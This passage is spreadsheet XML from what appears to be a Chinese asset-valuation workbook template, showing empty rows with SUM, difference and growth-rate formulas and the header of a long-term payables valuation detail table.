      <c r="F8" s="380" t="n"/>
      <c r="G8" s="555" t="n"/>
      <c r="H8" s="555" t="n"/>
      <c r="I8" s="555">
        <f>H8-G8</f>
        <v/>
      </c>
      <c r="J8" s="555">
        <f>IF(G8=0,"",I8/G8*100)</f>
        <v/>
      </c>
      <c r="K8" s="380" t="n"/>
    </row>
    <row r="9" ht="16.5" customHeight="1" s="415">
      <c r="A9" s="116" t="n"/>
      <c r="B9" s="380" t="n"/>
      <c r="C9" s="381" t="n"/>
      <c r="D9" s="578" t="n"/>
      <c r="E9" s="578" t="n"/>
      <c r="F9" s="380" t="n"/>
      <c r="G9" s="621" t="n"/>
      <c r="H9" s="621" t="n"/>
      <c r="I9" s="555">
        <f>H9-G9</f>
        <v/>
      </c>
      <c r="J9" s="555">
        <f>IF(G9=0,"",I9/G9*100)</f>
        <v/>
      </c>
      <c r="K9" s="383" t="n"/>
    </row>
    <row r="10" ht="16.5" customHeight="1" s="415">
      <c r="A10" s="116" t="n"/>
      <c r="B10" s="380" t="n"/>
      <c r="C10" s="381" t="n"/>
      <c r="D10" s="578" t="n"/>
      <c r="E10" s="578" t="n"/>
      <c r="F10" s="380" t="n"/>
      <c r="G10" s="621" t="n"/>
      <c r="H10" s="621" t="n"/>
      <c r="I10" s="555">
        <f>H10-G10</f>
        <v/>
      </c>
      <c r="J10" s="555">
        <f>IF(G10=0,"",I10/G10*100)</f>
        <v/>
      </c>
      <c r="K10" s="383" t="n"/>
    </row>
    <row r="11" ht="16.5" customHeight="1" s="415">
      <c r="A11" s="116" t="n"/>
      <c r="B11" s="380" t="n"/>
      <c r="C11" s="381" t="n"/>
      <c r="D11" s="578" t="n"/>
      <c r="E11" s="578" t="n"/>
      <c r="F11" s="380" t="n"/>
      <c r="G11" s="621" t="n"/>
      <c r="H11" s="621" t="n"/>
      <c r="I11" s="555">
        <f>H11-G11</f>
        <v/>
      </c>
      <c r="J11" s="555">
        <f>IF(G11=0,"",I11/G11*100)</f>
        <v/>
      </c>
      <c r="K11" s="383" t="n"/>
    </row>
    <row r="12" ht="16.5" customHeight="1" s="415">
      <c r="A12" s="116" t="n"/>
      <c r="B12" s="380" t="n"/>
      <c r="C12" s="381" t="n"/>
      <c r="D12" s="578" t="n"/>
      <c r="E12" s="578" t="n"/>
      <c r="F12" s="380" t="n"/>
      <c r="G12" s="621" t="n"/>
      <c r="H12" s="621" t="n"/>
      <c r="I12" s="555">
        <f>H12-G12</f>
        <v/>
      </c>
      <c r="J12" s="555">
        <f>IF(G12=0,"",I12/G12*100)</f>
        <v/>
      </c>
      <c r="K12" s="383" t="n"/>
    </row>
    <row r="13" ht="16.5" customHeight="1" s="415">
      <c r="A13" s="116" t="n"/>
      <c r="B13" s="380" t="n"/>
      <c r="C13" s="381" t="n"/>
      <c r="D13" s="578" t="n"/>
      <c r="E13" s="578" t="n"/>
      <c r="F13" s="380" t="n"/>
      <c r="G13" s="621" t="n"/>
      <c r="H13" s="621" t="n"/>
      <c r="I13" s="555">
        <f>H13-G13</f>
        <v/>
      </c>
      <c r="J13" s="555">
        <f>IF(G13=0,"",I13/G13*100)</f>
        <v/>
      </c>
      <c r="K13" s="383" t="n"/>
    </row>
    <row r="14" ht="16.5" customHeight="1" s="415">
      <c r="A14" s="116" t="n"/>
      <c r="B14" s="380" t="n"/>
      <c r="C14" s="381" t="n"/>
      <c r="D14" s="578" t="n"/>
      <c r="E14" s="578" t="n"/>
      <c r="F14" s="380" t="n"/>
      <c r="G14" s="621" t="n"/>
      <c r="H14" s="621" t="n"/>
      <c r="I14" s="555">
        <f>H14-G14</f>
        <v/>
      </c>
      <c r="J14" s="555">
        <f>IF(G14=0,"",I14/G14*100)</f>
        <v/>
      </c>
      <c r="K14" s="383" t="n"/>
    </row>
    <row r="15" ht="16.5" customHeight="1" s="415">
      <c r="A15" s="116" t="n"/>
      <c r="B15" s="380" t="n"/>
      <c r="C15" s="381" t="n"/>
      <c r="D15" s="578" t="n"/>
      <c r="E15" s="578" t="n"/>
      <c r="F15" s="380" t="n"/>
      <c r="G15" s="621" t="n"/>
      <c r="H15" s="621" t="n"/>
      <c r="I15" s="555">
        <f>H15-G15</f>
        <v/>
      </c>
      <c r="J15" s="555">
        <f>IF(G15=0,"",I15/G15*100)</f>
        <v/>
      </c>
      <c r="K15" s="383" t="n"/>
    </row>
    <row r="16" ht="16.5" customHeight="1" s="415">
      <c r="A16" s="116" t="n"/>
      <c r="B16" s="380" t="n"/>
      <c r="C16" s="381" t="n"/>
      <c r="D16" s="578" t="n"/>
      <c r="E16" s="578" t="n"/>
      <c r="F16" s="380" t="n"/>
      <c r="G16" s="621" t="n"/>
      <c r="H16" s="621" t="n"/>
      <c r="I16" s="555">
        <f>H16-G16</f>
        <v/>
      </c>
      <c r="J16" s="555">
        <f>IF(G16=0,"",I16/G16*100)</f>
        <v/>
      </c>
      <c r="K16" s="383" t="n"/>
    </row>
    <row r="17" ht="16.5" customHeight="1" s="415">
      <c r="A17" s="116" t="n"/>
      <c r="B17" s="380" t="n"/>
      <c r="C17" s="381" t="n"/>
      <c r="D17" s="578" t="n"/>
      <c r="E17" s="578" t="n"/>
      <c r="F17" s="380" t="n"/>
      <c r="G17" s="621" t="n"/>
      <c r="H17" s="621" t="n"/>
      <c r="I17" s="555">
        <f>H17-G17</f>
        <v/>
      </c>
      <c r="J17" s="555">
        <f>IF(G17=0,"",I17/G17*100)</f>
        <v/>
      </c>
      <c r="K17" s="383" t="n"/>
    </row>
    <row r="18" ht="16.5" customHeight="1" s="415">
      <c r="A18" s="116" t="n"/>
      <c r="B18" s="380" t="n"/>
      <c r="C18" s="381" t="n"/>
      <c r="D18" s="578" t="n"/>
      <c r="E18" s="578" t="n"/>
      <c r="F18" s="380" t="n"/>
      <c r="G18" s="621" t="n"/>
      <c r="H18" s="621" t="n"/>
      <c r="I18" s="555">
        <f>H18-G18</f>
        <v/>
      </c>
      <c r="J18" s="555">
        <f>IF(G18=0,"",I18/G18*100)</f>
        <v/>
      </c>
      <c r="K18" s="383" t="n"/>
    </row>
    <row r="19" ht="16.5" customHeight="1" s="415">
      <c r="A19" s="116" t="n"/>
      <c r="B19" s="380" t="n"/>
      <c r="C19" s="381" t="n"/>
      <c r="D19" s="578" t="n"/>
      <c r="E19" s="578" t="n"/>
      <c r="F19" s="380" t="n"/>
      <c r="G19" s="621" t="n"/>
      <c r="H19" s="621" t="n"/>
      <c r="I19" s="555">
        <f>H19-G19</f>
        <v/>
      </c>
      <c r="J19" s="555">
        <f>IF(G19=0,"",I19/G19*100)</f>
        <v/>
      </c>
      <c r="K19" s="383" t="n"/>
    </row>
    <row r="20" ht="16.5" customHeight="1" s="415">
      <c r="A20" s="116" t="n"/>
      <c r="B20" s="380" t="n"/>
      <c r="C20" s="381" t="n"/>
      <c r="D20" s="578" t="n"/>
      <c r="E20" s="578" t="n"/>
      <c r="F20" s="380" t="n"/>
      <c r="G20" s="621" t="n"/>
      <c r="H20" s="621" t="n"/>
      <c r="I20" s="555">
        <f>H20-G20</f>
        <v/>
      </c>
      <c r="J20" s="555">
        <f>IF(G20=0,"",I20/G20*100)</f>
        <v/>
      </c>
      <c r="K20" s="383" t="n"/>
    </row>
    <row r="21" ht="16.5" customHeight="1" s="415">
      <c r="A21" s="116" t="n"/>
      <c r="B21" s="380" t="n"/>
      <c r="C21" s="381" t="n"/>
      <c r="D21" s="578" t="n"/>
      <c r="E21" s="578" t="n"/>
      <c r="F21" s="380" t="n"/>
      <c r="G21" s="621" t="n"/>
      <c r="H21" s="621" t="n"/>
      <c r="I21" s="555">
        <f>H21-G21</f>
        <v/>
      </c>
      <c r="J21" s="555">
        <f>IF(G21=0,"",I21/G21*100)</f>
        <v/>
      </c>
      <c r="K21" s="383" t="n"/>
    </row>
    <row r="22" ht="16.5" customHeight="1" s="415">
      <c r="A22" s="116" t="n"/>
      <c r="B22" s="380" t="n"/>
      <c r="C22" s="381" t="n"/>
      <c r="D22" s="578" t="n"/>
      <c r="E22" s="578" t="n"/>
      <c r="F22" s="380" t="n"/>
      <c r="G22" s="621" t="n"/>
      <c r="H22" s="621" t="n"/>
      <c r="I22" s="555">
        <f>H22-G22</f>
        <v/>
      </c>
      <c r="J22" s="555">
        <f>IF(G22=0,"",I22/G22*100)</f>
        <v/>
      </c>
      <c r="K22" s="383" t="n"/>
    </row>
    <row r="23" ht="16.5" customHeight="1" s="415">
      <c r="A23" s="116" t="n"/>
      <c r="B23" s="380" t="n"/>
      <c r="C23" s="381" t="n"/>
      <c r="D23" s="578" t="n"/>
      <c r="E23" s="578" t="n"/>
      <c r="F23" s="380" t="n"/>
      <c r="G23" s="621" t="n"/>
      <c r="H23" s="621" t="n"/>
      <c r="I23" s="555">
        <f>H23-G23</f>
        <v/>
      </c>
      <c r="J23" s="555">
        <f>IF(G23=0,"",I23/G23*100)</f>
        <v/>
      </c>
      <c r="K23" s="383" t="n"/>
    </row>
    <row r="24" ht="16.5" customHeight="1" s="415">
      <c r="A24" s="116" t="n"/>
      <c r="B24" s="380" t="n"/>
      <c r="C24" s="381" t="n"/>
      <c r="D24" s="578" t="n"/>
      <c r="E24" s="578" t="n"/>
      <c r="F24" s="380" t="n"/>
      <c r="G24" s="621" t="n"/>
      <c r="H24" s="621" t="n"/>
      <c r="I24" s="555">
        <f>H24-G24</f>
        <v/>
      </c>
      <c r="J24" s="555">
        <f>IF(G24=0,"",I24/G24*100)</f>
        <v/>
      </c>
      <c r="K24" s="383" t="n"/>
    </row>
    <row r="25" ht="16.5" customHeight="1" s="415">
      <c r="A25" s="116" t="n"/>
      <c r="B25" s="380" t="n"/>
      <c r="C25" s="381" t="n"/>
      <c r="D25" s="578" t="n"/>
      <c r="E25" s="578" t="n"/>
      <c r="F25" s="380" t="n"/>
      <c r="G25" s="621" t="n"/>
      <c r="H25" s="621" t="n"/>
      <c r="I25" s="555">
        <f>H25-G25</f>
        <v/>
      </c>
      <c r="J25" s="555">
        <f>IF(G25=0,"",I25/G25*100)</f>
        <v/>
      </c>
      <c r="K25" s="383" t="n"/>
    </row>
    <row r="26" ht="16.5" customHeight="1" s="415">
      <c r="A26" s="116" t="n"/>
      <c r="B26" s="380" t="n"/>
      <c r="C26" s="381" t="n"/>
      <c r="D26" s="578" t="n"/>
      <c r="E26" s="578" t="n"/>
      <c r="F26" s="380" t="n"/>
      <c r="G26" s="621" t="n"/>
      <c r="H26" s="621" t="n"/>
      <c r="I26" s="555">
        <f>H26-G26</f>
        <v/>
      </c>
      <c r="J26" s="555">
        <f>IF(G26=0,"",I26/G26*100)</f>
        <v/>
      </c>
      <c r="K26" s="383" t="n"/>
    </row>
    <row r="27" ht="16.5" customHeight="1" s="415">
      <c r="A27" s="116" t="n"/>
      <c r="B27" s="380" t="n"/>
      <c r="C27" s="381" t="n"/>
      <c r="D27" s="578" t="n"/>
      <c r="E27" s="578" t="n"/>
      <c r="F27" s="380" t="n"/>
      <c r="G27" s="621" t="n"/>
      <c r="H27" s="621" t="n"/>
      <c r="I27" s="555">
        <f>H27-G27</f>
        <v/>
      </c>
      <c r="J27" s="555">
        <f>IF(G27=0,"",I27/G27*100)</f>
        <v/>
      </c>
      <c r="K27" s="383" t="n"/>
    </row>
    <row r="28" ht="16.5" customHeight="1" s="415">
      <c r="A28" s="116" t="inlineStr">
        <is>
          <t>合计1</t>
        </is>
      </c>
      <c r="B28" s="380" t="inlineStr">
        <is>
          <t>合            计</t>
        </is>
      </c>
      <c r="C28" s="567" t="n"/>
      <c r="D28" s="134" t="n"/>
      <c r="E28" s="135" t="n"/>
      <c r="F28" s="136" t="n"/>
      <c r="G28" s="560">
        <f>ROUND(SUM(G7:G27),2)</f>
        <v/>
      </c>
      <c r="H28" s="622">
        <f>ROUND(SUM(H7:H27),2)</f>
        <v/>
      </c>
      <c r="I28" s="555">
        <f>H28-G28</f>
        <v/>
      </c>
      <c r="J28" s="555">
        <f>IF(G28=0,"",I28/G28*100)</f>
        <v/>
      </c>
      <c r="K28" s="383" t="n"/>
    </row>
  </sheetData>
  <mergeCells count="14">
    <mergeCell ref="B4:F4"/>
    <mergeCell ref="G5:G6"/>
    <mergeCell ref="E5:E6"/>
    <mergeCell ref="H5:H6"/>
    <mergeCell ref="B1:K1"/>
    <mergeCell ref="J5:J6"/>
    <mergeCell ref="B5:B6"/>
    <mergeCell ref="B28:C28"/>
    <mergeCell ref="B2:K2"/>
    <mergeCell ref="C5:C6"/>
    <mergeCell ref="F5:F6"/>
    <mergeCell ref="K5:K6"/>
    <mergeCell ref="I5:I6"/>
    <mergeCell ref="D5:D6"/>
  </mergeCells>
  <conditionalFormatting sqref="B5:K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3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 codeName="Sheet100">
    <outlinePr summaryBelow="1" summaryRight="1"/>
    <pageSetUpPr fitToPage="1"/>
  </sheetPr>
  <dimension ref="A1:O30"/>
  <sheetViews>
    <sheetView view="pageBreakPreview" zoomScaleNormal="100" workbookViewId="0">
      <selection activeCell="A7" sqref="A7:A29"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr baseColWidth="8" defaultColWidth="9" defaultRowHeight="15.75" customHeight="1"/>
  <cols>
    <col width="12.8333333333333" customWidth="1" style="410" min="1" max="1"/>
    <col width="11.3333333333333" customWidth="1" style="410" min="2" max="2"/>
    <col width="24.3333333333333" customWidth="1" style="410" min="3" max="3"/>
    <col width="9.66666666666667" customWidth="1" style="410" min="4" max="4"/>
    <col width="8.83333333333333" customWidth="1" style="410" min="5" max="5"/>
    <col outlineLevel="1" width="8.66666666666667" customWidth="1" style="410" min="6" max="6"/>
    <col outlineLevel="1" width="13" customWidth="1" style="410" min="7" max="7"/>
    <col outlineLevel="1" width="10.6666666666667" customWidth="1" style="410" min="8" max="8"/>
    <col width="15.6666666666667" customWidth="1" style="410" min="9" max="11"/>
    <col outlineLevel="1" width="15.6666666666667" customWidth="1" style="410" min="12" max="13"/>
    <col outlineLevel="1" width="8.66666666666667" customWidth="1" style="410" min="14" max="14"/>
    <col width="12.6666666666667" customWidth="1" style="410" min="15" max="15"/>
    <col width="9" customWidth="1" style="410" min="16" max="16384"/>
  </cols>
  <sheetData>
    <row r="1" ht="30" customFormat="1" customHeight="1" s="368">
      <c r="A1" s="116" t="inlineStr">
        <is>
          <t>表头区域</t>
        </is>
      </c>
      <c r="B1" s="371" t="inlineStr">
        <is>
          <t>长期应付款评估明细表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547" t="n"/>
      <c r="K3" s="547" t="n"/>
      <c r="L3" s="373" t="n"/>
      <c r="M3" s="373" t="n"/>
      <c r="N3" s="373" t="n"/>
      <c r="O3" s="402" t="inlineStr">
        <is>
          <t>表6-4</t>
        </is>
      </c>
    </row>
    <row r="4" ht="16.5" customHeight="1" s="41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376" t="n"/>
      <c r="K4" s="376" t="n"/>
      <c r="L4" s="376" t="n"/>
      <c r="M4" s="376" t="n"/>
      <c r="N4" s="376" t="n"/>
      <c r="O4" s="402">
        <f>'2-分类汇总'!H4</f>
        <v/>
      </c>
    </row>
    <row r="5" ht="16.5" customFormat="1" customHeight="1" s="204">
      <c r="A5" s="116" t="inlineStr">
        <is>
          <t>检索表头1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业务内容</t>
        </is>
      </c>
      <c r="F5" s="380" t="inlineStr">
        <is>
          <t>币种</t>
        </is>
      </c>
      <c r="G5" s="380" t="inlineStr">
        <is>
          <t>外币账面金额</t>
        </is>
      </c>
      <c r="H5" s="380" t="inlineStr">
        <is>
          <t>评估基准日汇率</t>
        </is>
      </c>
      <c r="I5" s="380" t="inlineStr">
        <is>
          <t>账面价值</t>
        </is>
      </c>
      <c r="J5" s="593" t="n"/>
      <c r="K5" s="567" t="n"/>
      <c r="L5" s="380" t="inlineStr">
        <is>
          <t>评估价值</t>
        </is>
      </c>
      <c r="M5" s="380" t="inlineStr">
        <is>
          <t>增值额</t>
        </is>
      </c>
      <c r="N5" s="380" t="inlineStr">
        <is>
          <t>增值率%</t>
        </is>
      </c>
      <c r="O5" s="380" t="inlineStr">
        <is>
          <t>备注</t>
        </is>
      </c>
    </row>
    <row r="6" ht="16.5" customFormat="1" customHeight="1" s="204">
      <c r="A6" s="116" t="inlineStr">
        <is>
          <t>检索表头2</t>
        </is>
      </c>
      <c r="B6" s="594" t="n"/>
      <c r="C6" s="594" t="n"/>
      <c r="D6" s="594" t="n"/>
      <c r="E6" s="594" t="n"/>
      <c r="F6" s="594" t="n"/>
      <c r="G6" s="594" t="n"/>
      <c r="H6" s="594" t="n"/>
      <c r="I6" s="380" t="inlineStr">
        <is>
          <t>初始额</t>
        </is>
      </c>
      <c r="J6" s="380" t="inlineStr">
        <is>
          <t>利息及汇率净损失</t>
        </is>
      </c>
      <c r="K6" s="380" t="inlineStr">
        <is>
          <t>合计</t>
        </is>
      </c>
      <c r="L6" s="594" t="n"/>
      <c r="M6" s="594" t="n"/>
      <c r="N6" s="594" t="n"/>
      <c r="O6" s="594" t="n"/>
    </row>
    <row r="7" ht="16.5" customFormat="1" customHeight="1" s="204">
      <c r="A7" s="116" t="n"/>
      <c r="B7" s="380" t="n"/>
      <c r="C7" s="380" t="n"/>
      <c r="D7" s="578" t="n"/>
      <c r="E7" s="380" t="n"/>
      <c r="F7" s="380" t="n"/>
      <c r="G7" s="580" t="n"/>
      <c r="H7" s="619" t="n"/>
      <c r="I7" s="555" t="n"/>
      <c r="J7" s="555" t="n"/>
      <c r="K7" s="555">
        <f>SUM(I7:J7)</f>
        <v/>
      </c>
      <c r="L7" s="555" t="n"/>
      <c r="M7" s="555">
        <f>L7-K7</f>
        <v/>
      </c>
      <c r="N7" s="555">
        <f>IF(K7=0,"",M7/K7*100)</f>
        <v/>
      </c>
      <c r="O7" s="380" t="n"/>
    </row>
    <row r="8" ht="16.5" customFormat="1" customHeight="1" s="204">
      <c r="A8" s="116" t="n"/>
      <c r="B8" s="380" t="n"/>
      <c r="C8" s="380" t="n"/>
      <c r="D8" s="578" t="n"/>
      <c r="E8" s="380" t="n"/>
      <c r="F8" s="380" t="n"/>
      <c r="G8" s="580" t="n"/>
      <c r="H8" s="619" t="n"/>
      <c r="I8" s="555" t="n"/>
      <c r="J8" s="555" t="n"/>
      <c r="K8" s="555">
        <f>SUM(I8:J8)</f>
        <v/>
      </c>
      <c r="L8" s="555" t="n"/>
      <c r="M8" s="555">
        <f>L8-K8</f>
        <v/>
      </c>
      <c r="N8" s="555">
        <f>IF(K8=0,"",M8/K8*100)</f>
        <v/>
      </c>
      <c r="O8" s="380" t="n"/>
    </row>
    <row r="9" ht="16.5" customHeight="1" s="415">
      <c r="A9" s="116" t="n"/>
      <c r="B9" s="380" t="n"/>
      <c r="C9" s="381" t="n"/>
      <c r="D9" s="578" t="n"/>
      <c r="E9" s="380" t="n"/>
      <c r="F9" s="380" t="n"/>
      <c r="G9" s="580" t="n"/>
      <c r="H9" s="619" t="n"/>
      <c r="I9" s="560" t="n"/>
      <c r="J9" s="555" t="n"/>
      <c r="K9" s="555">
        <f>SUM(I9:J9)</f>
        <v/>
      </c>
      <c r="L9" s="621" t="n"/>
      <c r="M9" s="555">
        <f>L9-K9</f>
        <v/>
      </c>
      <c r="N9" s="555">
        <f>IF(K9=0,"",M9/K9*100)</f>
        <v/>
      </c>
      <c r="O9" s="383" t="n"/>
    </row>
    <row r="10" ht="16.5" customHeight="1" s="415">
      <c r="A10" s="116" t="n"/>
      <c r="B10" s="380" t="n"/>
      <c r="C10" s="381" t="n"/>
      <c r="D10" s="578" t="n"/>
      <c r="E10" s="380" t="n"/>
      <c r="F10" s="380" t="n"/>
      <c r="G10" s="580" t="n"/>
      <c r="H10" s="619" t="n"/>
      <c r="I10" s="560" t="n"/>
      <c r="J10" s="555" t="n"/>
      <c r="K10" s="555">
        <f>SUM(I10:J10)</f>
        <v/>
      </c>
      <c r="L10" s="621" t="n"/>
      <c r="M10" s="555">
        <f>L10-K10</f>
        <v/>
      </c>
      <c r="N10" s="555">
        <f>IF(K10=0,"",M10/K10*100)</f>
        <v/>
      </c>
      <c r="O10" s="383" t="n"/>
    </row>
    <row r="11" ht="16.5" customHeight="1" s="415">
      <c r="A11" s="116" t="n"/>
      <c r="B11" s="380" t="n"/>
      <c r="C11" s="381" t="n"/>
      <c r="D11" s="578" t="n"/>
      <c r="E11" s="380" t="n"/>
      <c r="F11" s="380" t="n"/>
      <c r="G11" s="580" t="n"/>
      <c r="H11" s="619" t="n"/>
      <c r="I11" s="560" t="n"/>
      <c r="J11" s="555" t="n"/>
      <c r="K11" s="555">
        <f>SUM(I11:J11)</f>
        <v/>
      </c>
      <c r="L11" s="621" t="n"/>
      <c r="M11" s="555">
        <f>L11-K11</f>
        <v/>
      </c>
      <c r="N11" s="555">
        <f>IF(K11=0,"",M11/K11*100)</f>
        <v/>
      </c>
      <c r="O11" s="383" t="n"/>
    </row>
    <row r="12" ht="16.5" customHeight="1" s="415">
      <c r="A12" s="116" t="n"/>
      <c r="B12" s="380" t="n"/>
      <c r="C12" s="381" t="n"/>
      <c r="D12" s="578" t="n"/>
      <c r="E12" s="380" t="n"/>
      <c r="F12" s="380" t="n"/>
      <c r="G12" s="580" t="n"/>
      <c r="H12" s="619" t="n"/>
      <c r="I12" s="560" t="n"/>
      <c r="J12" s="555" t="n"/>
      <c r="K12" s="555">
        <f>SUM(I12:J12)</f>
        <v/>
      </c>
      <c r="L12" s="621" t="n"/>
      <c r="M12" s="555">
        <f>L12-K12</f>
        <v/>
      </c>
      <c r="N12" s="555">
        <f>IF(K12=0,"",M12/K12*100)</f>
        <v/>
      </c>
      <c r="O12" s="383" t="n"/>
    </row>
    <row r="13" ht="16.5" customHeight="1" s="415">
      <c r="A13" s="116" t="n"/>
      <c r="B13" s="380" t="n"/>
      <c r="C13" s="381" t="n"/>
      <c r="D13" s="578" t="n"/>
      <c r="E13" s="380" t="n"/>
      <c r="F13" s="380" t="n"/>
      <c r="G13" s="580" t="n"/>
      <c r="H13" s="619" t="n"/>
      <c r="I13" s="560" t="n"/>
      <c r="J13" s="555" t="n"/>
      <c r="K13" s="555">
        <f>SUM(I13:J13)</f>
        <v/>
      </c>
      <c r="L13" s="621" t="n"/>
      <c r="M13" s="555">
        <f>L13-K13</f>
        <v/>
      </c>
      <c r="N13" s="555">
        <f>IF(K13=0,"",M13/K13*100)</f>
        <v/>
      </c>
      <c r="O13" s="383" t="n"/>
    </row>
    <row r="14" ht="16.5" customHeight="1" s="415">
      <c r="A14" s="116" t="n"/>
      <c r="B14" s="380" t="n"/>
      <c r="C14" s="381" t="n"/>
      <c r="D14" s="578" t="n"/>
      <c r="E14" s="380" t="n"/>
      <c r="F14" s="380" t="n"/>
      <c r="G14" s="580" t="n"/>
      <c r="H14" s="619" t="n"/>
      <c r="I14" s="560" t="n"/>
      <c r="J14" s="555" t="n"/>
      <c r="K14" s="555">
        <f>SUM(I14:J14)</f>
        <v/>
      </c>
      <c r="L14" s="621" t="n"/>
      <c r="M14" s="555">
        <f>L14-K14</f>
        <v/>
      </c>
      <c r="N14" s="555">
        <f>IF(K14=0,"",M14/K14*100)</f>
        <v/>
      </c>
      <c r="O14" s="383" t="n"/>
    </row>
    <row r="15" ht="16.5" customHeight="1" s="415">
      <c r="A15" s="116" t="n"/>
      <c r="B15" s="380" t="n"/>
      <c r="C15" s="381" t="n"/>
      <c r="D15" s="578" t="n"/>
      <c r="E15" s="380" t="n"/>
      <c r="F15" s="380" t="n"/>
      <c r="G15" s="580" t="n"/>
      <c r="H15" s="619" t="n"/>
      <c r="I15" s="560" t="n"/>
      <c r="J15" s="555" t="n"/>
      <c r="K15" s="555">
        <f>SUM(I15:J15)</f>
        <v/>
      </c>
      <c r="L15" s="621" t="n"/>
      <c r="M15" s="555">
        <f>L15-K15</f>
        <v/>
      </c>
      <c r="N15" s="555">
        <f>IF(K15=0,"",M15/K15*100)</f>
        <v/>
      </c>
      <c r="O15" s="383" t="n"/>
    </row>
    <row r="16" ht="16.5" customHeight="1" s="415">
      <c r="A16" s="116" t="n"/>
      <c r="B16" s="380" t="n"/>
      <c r="C16" s="381" t="n"/>
      <c r="D16" s="578" t="n"/>
      <c r="E16" s="380" t="n"/>
      <c r="F16" s="380" t="n"/>
      <c r="G16" s="580" t="n"/>
      <c r="H16" s="619" t="n"/>
      <c r="I16" s="560" t="n"/>
      <c r="J16" s="555" t="n"/>
      <c r="K16" s="555">
        <f>SUM(I16:J16)</f>
        <v/>
      </c>
      <c r="L16" s="621" t="n"/>
      <c r="M16" s="555">
        <f>L16-K16</f>
        <v/>
      </c>
      <c r="N16" s="555">
        <f>IF(K16=0,"",M16/K16*100)</f>
        <v/>
      </c>
      <c r="O16" s="383" t="n"/>
    </row>
    <row r="17" ht="16.5" customHeight="1" s="415">
      <c r="A17" s="116" t="n"/>
      <c r="B17" s="380" t="n"/>
      <c r="C17" s="381" t="n"/>
      <c r="D17" s="578" t="n"/>
      <c r="E17" s="380" t="n"/>
      <c r="F17" s="380" t="n"/>
      <c r="G17" s="580" t="n"/>
      <c r="H17" s="619" t="n"/>
      <c r="I17" s="560" t="n"/>
      <c r="J17" s="555" t="n"/>
      <c r="K17" s="555">
        <f>SUM(I17:J17)</f>
        <v/>
      </c>
      <c r="L17" s="621" t="n"/>
      <c r="M17" s="555">
        <f>L17-K17</f>
        <v/>
      </c>
      <c r="N17" s="555">
        <f>IF(K17=0,"",M17/K17*100)</f>
        <v/>
      </c>
      <c r="O17" s="383" t="n"/>
    </row>
    <row r="18" ht="16.5" customHeight="1" s="415">
      <c r="A18" s="116" t="n"/>
      <c r="B18" s="380" t="n"/>
      <c r="C18" s="381" t="n"/>
      <c r="D18" s="578" t="n"/>
      <c r="E18" s="380" t="n"/>
      <c r="F18" s="380" t="n"/>
      <c r="G18" s="580" t="n"/>
      <c r="H18" s="619" t="n"/>
      <c r="I18" s="560" t="n"/>
      <c r="J18" s="555" t="n"/>
      <c r="K18" s="555">
        <f>SUM(I18:J18)</f>
        <v/>
      </c>
      <c r="L18" s="621" t="n"/>
      <c r="M18" s="555">
        <f>L18-K18</f>
        <v/>
      </c>
      <c r="N18" s="555">
        <f>IF(K18=0,"",M18/K18*100)</f>
        <v/>
      </c>
      <c r="O18" s="383" t="n"/>
    </row>
    <row r="19" ht="16.5" customHeight="1" s="415">
      <c r="A19" s="116" t="n"/>
      <c r="B19" s="380" t="n"/>
      <c r="C19" s="381" t="n"/>
      <c r="D19" s="578" t="n"/>
      <c r="E19" s="380" t="n"/>
      <c r="F19" s="380" t="n"/>
      <c r="G19" s="580" t="n"/>
      <c r="H19" s="619" t="n"/>
      <c r="I19" s="560" t="n"/>
      <c r="J19" s="555" t="n"/>
      <c r="K19" s="555">
        <f>SUM(I19:J19)</f>
        <v/>
      </c>
      <c r="L19" s="621" t="n"/>
      <c r="M19" s="555">
        <f>L19-K19</f>
        <v/>
      </c>
      <c r="N19" s="555">
        <f>IF(K19=0,"",M19/K19*100)</f>
        <v/>
      </c>
      <c r="O19" s="383" t="n"/>
    </row>
    <row r="20" ht="16.5" customHeight="1" s="415">
      <c r="A20" s="116" t="n"/>
      <c r="B20" s="380" t="n"/>
      <c r="C20" s="381" t="n"/>
      <c r="D20" s="578" t="n"/>
      <c r="E20" s="380" t="n"/>
      <c r="F20" s="380" t="n"/>
      <c r="G20" s="580" t="n"/>
      <c r="H20" s="619" t="n"/>
      <c r="I20" s="560" t="n"/>
      <c r="J20" s="555" t="n"/>
      <c r="K20" s="555">
        <f>SUM(I20:J20)</f>
        <v/>
      </c>
      <c r="L20" s="621" t="n"/>
      <c r="M20" s="555">
        <f>L20-K20</f>
        <v/>
      </c>
      <c r="N20" s="555">
        <f>IF(K20=0,"",M20/K20*100)</f>
        <v/>
      </c>
      <c r="O20" s="383" t="n"/>
    </row>
    <row r="21" ht="16.5" customHeight="1" s="415">
      <c r="A21" s="116" t="n"/>
      <c r="B21" s="380" t="n"/>
      <c r="C21" s="381" t="n"/>
      <c r="D21" s="578" t="n"/>
      <c r="E21" s="380" t="n"/>
      <c r="F21" s="380" t="n"/>
      <c r="G21" s="580" t="n"/>
      <c r="H21" s="619" t="n"/>
      <c r="I21" s="560" t="n"/>
      <c r="J21" s="555" t="n"/>
      <c r="K21" s="555">
        <f>SUM(I21:J21)</f>
        <v/>
      </c>
      <c r="L21" s="621" t="n"/>
      <c r="M21" s="555">
        <f>L21-K21</f>
        <v/>
      </c>
      <c r="N21" s="555">
        <f>IF(K21=0,"",M21/K21*100)</f>
        <v/>
      </c>
      <c r="O21" s="383" t="n"/>
    </row>
    <row r="22" ht="16.5" customHeight="1" s="415">
      <c r="A22" s="116" t="n"/>
      <c r="B22" s="380" t="n"/>
      <c r="C22" s="381" t="n"/>
      <c r="D22" s="578" t="n"/>
      <c r="E22" s="380" t="n"/>
      <c r="F22" s="380" t="n"/>
      <c r="G22" s="580" t="n"/>
      <c r="H22" s="619" t="n"/>
      <c r="I22" s="560" t="n"/>
      <c r="J22" s="555" t="n"/>
      <c r="K22" s="555">
        <f>SUM(I22:J22)</f>
        <v/>
      </c>
      <c r="L22" s="621" t="n"/>
      <c r="M22" s="555">
        <f>L22-K22</f>
        <v/>
      </c>
      <c r="N22" s="555">
        <f>IF(K22=0,"",M22/K22*100)</f>
        <v/>
      </c>
      <c r="O22" s="383" t="n"/>
    </row>
    <row r="23" ht="16.5" customHeight="1" s="415">
      <c r="A23" s="116" t="n"/>
      <c r="B23" s="380" t="n"/>
      <c r="C23" s="381" t="n"/>
      <c r="D23" s="578" t="n"/>
      <c r="E23" s="380" t="n"/>
      <c r="F23" s="380" t="n"/>
      <c r="G23" s="580" t="n"/>
      <c r="H23" s="619" t="n"/>
      <c r="I23" s="560" t="n"/>
      <c r="J23" s="555" t="n"/>
      <c r="K23" s="555">
        <f>SUM(I23:J23)</f>
        <v/>
      </c>
      <c r="L23" s="621" t="n"/>
